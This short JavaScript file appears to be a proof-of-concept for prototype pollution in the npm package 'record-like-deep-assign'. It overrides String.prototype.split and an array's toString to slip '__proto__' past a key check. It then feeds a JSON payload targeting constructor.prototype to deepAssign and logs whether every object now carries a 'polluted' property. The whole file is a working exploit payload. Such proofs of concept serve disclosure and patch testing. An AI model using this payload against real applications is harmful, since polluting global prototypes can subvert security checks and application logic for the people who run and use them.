var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const deepAssign = require('record-like-deep-assign');
console.log({}.polluted);
let obj = {};
EVIL_JSON = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
deepAssign({}, EVIL_JSON);
console.log({}.polluted);